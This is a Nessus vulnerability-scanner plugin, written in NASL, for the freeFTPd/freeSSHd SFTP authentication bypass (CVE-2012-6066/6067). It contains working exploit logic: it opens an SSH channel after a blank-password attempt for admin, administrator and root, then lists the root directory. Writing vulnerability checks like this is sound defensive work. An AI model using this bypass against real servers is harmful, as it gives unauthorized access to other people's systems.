#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63223);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/10/10 15:57:05 $");

  script_cve_id("CVE-2012-6066", "CVE-2012-6067");
  script_bugtraq_id(56782, 56785);
  script_osvdb_id(88006, 88296);
  script_xref(name:"EDB-ID", value:"23079");
  script_xref(name:"EDB-ID", value:"23080");
  script_xref(name:"EDB-ID", value:"24133");

  script_name(english:"freeFTPd / freeSSHd SFTP Authentication Bypass");
  script_summary(english:"Tries to bypass auth and get a dir listing");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The SFTP server running on the remote host has an authentication bypass
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The SFTP server included with freeFTPd or freeSSHd has an
authentication bypass vulnerability.  Authentication can be bypassed by
opening an SSH channel before any credentials are provided.  A remote,
unauthenticated attacker could exploit this to login without providing
credentials. 

After logging in, uploading specially crafted files could result in
arbitrary code execution as SYSTEM.  Refer to the researcher's advisory
for more information."
  );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2010/Aug/132");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2012/Dec/10");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2012/Dec/11");
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Freesshd Authentication Bypass');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/08/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/12/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:freeftpd:freeftpd");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:freesshd:freesshd");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("ssh_detect.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ssh_func.inc");
include("ssh_fxp_func.inc");


if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_service(svc:'ssh', default:22, exit_on_fail:TRUE);

# Make sure the SSH service looks like freeFTPd or freeSSHd
if (report_paranoia < 2 && banner = get_kb_item("SSH/banner/" + port))
{
  #    freeFTPd 1.0.11                  freeSSHd 1.2.6
  if ('WeOnlyDo-wodFTPD' >!< banner && '-WeOnlyDo ' >!< banner) audit(AUDIT_NOT_LISTEN, 'freeFTPd/freeSSHd SFTP Server', port);
}

dir = '/'; # dir to get a listing of after bypassing authentication
MAX_DISPLAYED_FILES = 10;
users = make_list(
  'administrator',
  'admin',
  'root'
);
want_reply = (report_paranoia == 0);


foreach user (users)
{
  _ssh_socket = open_sock_tcp(port);
  if (!_ssh_socket) audit(AUDIT_SOCK_FAIL, port);

  # initialization
  init();
  server_version = ssh_exchange_identification();
  if (!server_version)
  {
    ssh_close_connection();
    exit(1, get_ssh_error());
  }

  _ssh_server_version = server_version;

  # key exchange
  ret = ssh_kex2(server_version:server_version, nofingerprint:TRUE);
  if (ret != 0)
  {
    ssh_close_connection();
    exit(1, get_ssh_error());
  }

  if (!ssh_req_svc("ssh-userauth"))
  {
    ssh_close_connection();
    exit(0, "The SSH service listening on port "+port+" does not support 'ssh-userauth'.");
  }

  # nb: any password works, including a blank one. And there's no
  #     need to check the response.
  ssh_auth_keyboard(user:user, password:"");

  # we'll only be able to open a channel w/o auth against vulnerable servers
  ret = ssh_open_channel();
  if (ret != 0)
  {
    ssh_close_connection();
    audit(AUDIT_LISTEN_NOT_VULN, 'SSH', port);
  }

  # Check if the subsystem is supported.
  ret = ssh_request_subsystem(subsystem:"sftp", want_reply:want_reply);
  if (!ret)
  {
    ssh_close_connection();
    exit(0, "The SSH service listening on port "+port+" does not support SFTP.");
  }

  # Initialize the connection.
  fxp_protocol_version = 3;

  ssh_fxp_send_packet(type:SSH_FXP_INIT, data:raw_int32(fxp_protocol_version));
  # nb: if the username is not defined in freeSSHd, there will be a
  #     so we don't want to exit.
  res = ssh_fxp_recv_packet(exit_on_fail:FALSE);
  if (isnull(res))
  {
    ssh_close_connection();
    continue;
  }
  if (res['type'] != SSH_FXP_VERSION)
  {
    ssh_close_connection();
    exit(0, "The SSH server listening on port "+port+" responded with a packet type that was " + ord(res['type']) + ", not SSH_FXP_VERSION (" + SSH_FXP_VERSION + ")");
  }

  val = ntol(buffer:res['data'], begin:0);
  if (val != fxp_protocol_version)
  {
    ssh_close_connection();
    exit(0, "The SSH server listening on port "+port+" does not support version " + _ssh_fxp_protocol_version + " of the SFTP protocol; it supports " + val + ".");
  }

  if (report_verbosity > 0)
  {
    report = '\n' + 'Nessus was able to bypass authentication and gain access to the' +
             '\n' + 'following account :' +
                 '\n' +
                 '\n' + '  ' + user;

    listing = ssh_fxp_get_listing(dir:dir, max_files:MAX_DISPLAYED_FILES);
    if (!isnull(listing))
    {
      report += '\n' +
                '\n' + 'And it was able to collect the following listing of \'' + dir + '\' :' +
                '\n';
      foreach file (sort(keys(listing['files'])))
      {
        report += '\n' + '  ' + listing['files'][file];
      }
      if (listing['truncated'])
      {
        report += '\n' +
                  '\n' + 'Note that this listing is incomplete and limited to ' + MAX_DISPLAYED_FILES + ' entries.';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    ssh_fxp_close_connection();
    exit(0);
  }
}
audit(AUDIT_LISTEN_NOT_VULN, "freeFTPd / freeSSHd", port);
